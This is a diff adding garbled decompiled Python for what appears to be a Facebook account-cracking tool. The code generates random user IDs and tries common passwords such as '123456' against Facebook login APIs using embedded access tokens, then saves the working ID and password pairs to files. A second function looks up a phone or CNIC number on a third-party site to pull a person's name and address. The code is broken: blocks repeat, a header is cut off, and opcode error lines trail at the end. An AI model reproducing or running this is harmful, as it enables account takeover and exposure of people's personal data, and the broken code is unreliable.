@@ -603,4 +603,329 @@ def crackmbasic(idf, pwv):
             'Authentication': 'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662',
             'x-fb-connection-quality': 'EXCELLENT',
             'x-fb-connection-type': 'cell',
-            'x-fb-connection-bandwidth
+             'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
+            'x-fb-sim-hni': str(random.randint(20000, 40000)),
+            'x-fb-net-hni': str(random.randint(20000, 40000)),
+            'content-type': 'application/x-www-form-urlencoded',
+            'x-fb-friendly_name': 'authenticate' }
+        dataa = {
+            'return_multiple_errors': 'true',
+            'locale': 'en_US',
+            'client_country_code': 'en_US',
+            'access_token': '6628568379|c1e620fa708a1d5696fb991c1bde5662',
+            'server_timestamps': 'True',
+            'pretty': 'False',
+            'strip_defaults': 'True',
+            'strip_nulls': 'True',
+            'fb_api_caller_class': 'com.facebook.account.login.protocol.FbiosAuthHandler',
+            'fb_api_request_friendly_name': 'authenticate' }
+        r = requests.post('https://graph.facebook.com/auth/login', headers = head, verify = True, data = dataa)
+        ro = re.findall('uid": (.*?),', str(r.text))
+        for roid in ro:
+            'true'
+            roid = idf
+            if 'www.facebook.com' in r.text:
+                print(f'''   \r {rp}[ZABL-CP] {idf} | {pw}{s}''')
+                open('/sdcard/ZABL_cp.txt', 'a').write(roid + '|' + pw + '\n')
+                akun.append(idf + '|' + pw)
+                cp += 1
+                'attempt_login'
+        if 'session_key' in r.text:
+            ok += 1
+            print(f'''   \r {rg}[ZABL-OK] {roid} | {pw}{s}''')
+            open('/sdcard/ZABL_ok.txt', 'a').write(roid + '|' + pw + '\n')
+            '1'
+        if 'SMS shortly' in r.text:
+            print(f'''   \r {rc}[ZABL-2F] {idf} | {pw}{s}''')
+            open('/sdcard/ZABL_2f.txt', 'a').write(roid + '|' + pw + '\n')
+            'try_number'
+        loop += 1
+        return None
+
+
+def number_detail():
+    BeautifulSoup = BeautifulSoup
+    import bs4
+    parser = BeautifulSoup
+    import bs4
+    os.system('clear')
+    print(logo)
+    numm = input(' Number : ')
+    head = {
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept': '*/*',
+        'Connection': 'keep-alive',
+        'Content-Length': '16',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Referer': 'https://freepicccs.com/index2.php?msg=Please%20Enter%20atleast%201%20Mobile%20Number%20or%20CNIC' }
+    dataa = {
+        'cnnum': numm }
+    r = requests.post('https://freepicccs.com/search-result2.php', headers = head, data = dataa)
+    bc = re.findall('\\<div(.*?)</table>', str(r.text))
+    open('.tt1.txt', 'w').write(str(bc))
+    bx = open('.tt1.txt', 'r').read()
+    bx = bx.replace('</strong>', '<strong>')
+    bx = bx.split('<strong>')
+    number = bx[1]
+    number = ' '
+    date = bx[3]
+    date = ' '
+    name = bx[5]
+    name = ' '
+    address = bx[9]
+    address = ' '
+    cnic = bx[7]
+    cnic = ' '
+    print('--------------------------------------------------')
+    print(f''' Number : {number.capitalize()}''')
+    print(f''' Date : {date.capitalize()}''')
+    print(f''' Name : {name.capitalize()}''')
+    print(f''' Address : {address.capitalize()}''')
+    print(f''' Cnic : {cnic.capitalize()}''')
+    input('\x1b[0m[Press enter to back] ')
+    caseher()
+
+
+def main():
+    user = []
+    os.system('clear')
+    print(logo)
+    print('[+] Example   : 10000 | 20000 | 90000')
+    linex()
+    limit = input(' Select Any Option : ')
+    linex()
+    os.system('clear')
+    print(logo)
+    print('[1] Method ~ (2010-2009)')
+    linex()
+    ask = input(' Select Any Option : ')
+    linex()
+    if ask in ('1',):
+        star = '10000'
+        for i in range(int(limit)):
+            data = str(random.choice(range(1000000000, 1999999999)))
+            user.append(data)
+            star = '100000'
+            for i in range(int(limit)):
+                data = str(random.choice(range(1000000000, 1999999999)))
+                user.append(data)
+                MrDevilEx = ThreadPool(max_workers = 40)
+                os.system('clear')
+                print(logo)
+                print('Cloning Is Started Kindly Be Patient ... ')
+                print('Turn Airplane On Off When There Is Alert ')
+                print('The Speed Of Tool Depended In Your Network')
+                print('--------------------------------------------------')
+                for mal in user:
+                    uid = star + mal
+                    MrDevilEx.submit(login, uid)
+                    None(None, None)
+                    return None
+                    if not None:
+                        pass
+            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
+            'x-fb-sim-hni': str(random.randint(20000, 40000)),
+            'x-fb-net-hni': str(random.randint(20000, 40000)),
+            'content-type': 'application/x-www-form-urlencoded',
+            'x-fb-friendly_name': 'authenticate' }
+        dataa = {
+            'return_multiple_errors': 'true',
+            'locale': 'en_US',
+            'client_country_code': 'en_US',
+            'access_token': '6628568379|c1e620fa708a1d5696fb991c1bde5662',
+            'server_timestamps': 'True',
+            'pretty': 'False',
+            'strip_defaults': 'True',
+            'strip_nulls': 'True',
+            'fb_api_caller_class': 'com.facebook.account.login.protocol.FbiosAuthHandler',
+            'fb_api_request_friendly_name': 'authenticate' }
+        r = requests.post('https://graph.facebook.com/auth/login', headers = head, verify = True, data = dataa)
+        ro = re.findall('uid": (.*?),', str(r.text))
+        for roid in ro:
+            'true'
+            roid = idf
+            if 'www.facebook.com' in r.text:
+                print(f'''   \r {rp}[ZABL-CP] {idf} | {pw}{s}''')
+                open('/sdcard/ZABL_cp.txt', 'a').write(roid + '|' + pw + '\n')
+                akun.append(idf + '|' + pw)
+                cp += 1
+                'attempt_login'
+        if 'session_key' in r.text:
+            ok += 1
+            print(f'''   \r {rg}[ZABL-OK] {roid} | {pw}{s}''')
+            open('/sdcard/ZABL_ok.txt', 'a').write(roid + '|' + pw + '\n')
+            '1'
+        if 'SMS shortly' in r.text:
+            print(f'''   \r {rc}[ZABL-2F] {idf} | {pw}{s}''')
+            open('/sdcard/ZABL_2f.txt', 'a').write(roid + '|' + pw + '\n')
+            'try_number'
+        loop += 1
+        return None
+
+
+def number_detail():
+    BeautifulSoup = BeautifulSoup
+    import bs4
+    parser = BeautifulSoup
+    import bs4
+    os.system('clear')
+    print(logo)
+    numm = input(' Number : ')
+    head = {
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept': '*/*',
+        'Connection': 'keep-alive',
+        'Content-Length': '16',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Referer': 'https://freepicccs.com/index2.php?msg=Please%20Enter%20atleast%201%20Mobile%20Number%20or%20CNIC' }
+    dataa = {
+        'cnnum': numm }
+    r = requests.post('https://freepicccs.com/search-result2.php', headers = head, data = dataa)
+    bc = re.findall('\\<div(.*?)</table>', str(r.text))
+    open('.tt1.txt', 'w').write(str(bc))
+    bx = open('.tt1.txt', 'r').read()
+    bx = bx.replace('</strong>', '<strong>')
+    bx = bx.split('<strong>')
+    number = bx[1]
+    number = ' '
+    date = bx[3]
+    date = ' '
+    name = bx[5]
+    name = ' '
+    address = bx[9]
+    address = ' '
+    cnic = bx[7]
+    cnic = ' '
+    print('--------------------------------------------------')
+    print(f''' Number : {number.capitalize()}''')
+    print(f''' Date : {date.capitalize()}''')
+    print(f''' Name : {name.capitalize()}''')
+    print(f''' Address : {address.capitalize()}''')
+    print(f''' Cnic : {cnic.capitalize()}''')
+    input('\x1b[0m[Press enter to back] ')
+    caseher()
+
+
+def main():
+    user = []
+    os.system('clear')
+    print(logo)
+    print('[+] Example   : 10000 | 20000 | 90000')
+    linex()
+    limit = input(' Select Any Option : ')
+    linex()
+    os.system('clear')
+    print(logo)
+    print('[1] Method ~ (2010-2009)')
+    linex()
+    ask = input(' Select Any Option : ')
+    linex()
+    if ask in ('1',):
+        star = '10000'
+        for i in range(int(limit)):
+            data = str(random.choice(range(1000000000, 1999999999)))
+            user.append(data)
+            star = '100000'
+            for i in range(int(limit)):
+                data = str(random.choice(range(1000000000, 1999999999)))
+                user.append(data)
+                MrDevilEx = ThreadPool(max_workers = 40)
+                os.system('clear')
+                print(logo)
+                print('Cloning Is Started Kindly Be Patient ... ')
+                print('Turn Airplane On Off When There Is Alert ')
+                print('The Speed Of Tool Depended In Your Network')
+                print('--------------------------------------------------')
+                for mal in user:
+                    uid = star + mal
+                    MrDevilEx.submit(login, uid)
+                    None(None, None)
+                    return None
+                    if not None:
+                        pass
+loop = 0
+oks = []
+cps = []
+
+def login(uid):
+    global loop
+    Session = requests.session()
+    sys.stdout.write(f'''\r \x1b[0m[{aajdate}] {loop}/F1 {ok} ''')
+    sys.stdout.flush()
+    for pw in ('123456', '1234567', '12345678', '123456789', '123123', '143143'):
+        headers = {
+            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
+            'x-fb-sim-hni': str(random.randint(20000, 40000)),
+            'x-fb-net-hni': str(random.randint(20000, 40000)),
+            'x-fb-connection-quality': 'EXCELLENT',
+            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+            'user-agent': ua(),
+            'content-type': 'application/x-www-form-urlencoded',
+            'x-fb-http-engine': 'Liger' }
+        rp = Session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20Â¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = headers).json()
+        if 'session_key' in rp:
+            cps.append(uid)
+        if 'www.facebook.com' in rp['error_msg']:
+            cps.append(uid)
+        if 'Please Confirm Email' in str(rp):
+            print(f'''   \r {rg}[ZABL-OK] {uid} | {pw}''')
+            open('/sdcard/ZABL-OLD-OK.txt', 'a').write(uid + '|' + pw + '\n')
+            ok.append(uid)
+        loop += 1
+        return None
+        return None
+
+if __name__ == '__main__':
+    Get_Data().get()
+    return None
+
+Unsupported opcode: PUSH_EXC_INFO
+Unsupported opcode: CHECK_EXC_MATCH
+Unsupported opcode: RERAISE
+Unsupported opcode: COPY
+Unsupported opcode: RERAISE
+Unsupported opcode: PUSH_EXC_INFO
+Unsupported opcode: CHECK_EXC_MATCH
+Unsupported opcode: RERAISE
+Unsupported opcode: COPY
+Unsupported opcode: RERAISE
+Unsupported opcode: PUSH_EXC_INFO
+Unsupported opcode: CHECK_EXC_MATCH
+Unsupported opcode: RERAISE
+Unsupported opcode: COPY
+Unsupported opcode: RERAISE
+Unsupported opcode: BEFORE_WITH
+Unsupported opcode: PUSH_EXC_INFO
+Unsupported opcode: WITH_EXCEPT_START
+Unsupported opcode: RERAISE
+Unsupported opcode: COPY
+Unsupported opcode: RERAISE
+Unsupported opcode: BEFORE_WITH
+Unsupported opcode: PUSH_EXC_INFO
+Unsupported opcode: WITH_EXCEPT_START
+Unsupported opcode: RERAISE
+Unsupported opcode: COPY
+Unsupported opcode: RERAISE
+Unsupported opcode: BEFORE_WITH
+Unsupported opcode: PUSH_EXC_INFO
+Unsupported opcode: WITH_EXCEPT_START
+Unsupported opcode: RERAISE
+Unsupported opcode: COPY
+Unsupported opcode: RERAISE
+Unsupported opcode: BEFORE_WITH
+Unsupported opcode: PUSH_EXC_INFO
+Unsupported opcode: WITH_EXCEPT_START
+Unsupported opcode: RERAISE
+Unsupported opcode: COPY
+Unsupported opcode: RERAISE
+Unsupported opcode: JUMP_BACKWARD
+Unsupported opcode: PUSH_EXC_INFO
+Unsupported opcode: CHECK_EXC_MATCH
+Unsupported opcode: RERAISE
+Unsupported opcode: COPY
+Unsupported opcode: RERAISE
+Unsupported opcode: JUMP_BACKWARD      
+
+          
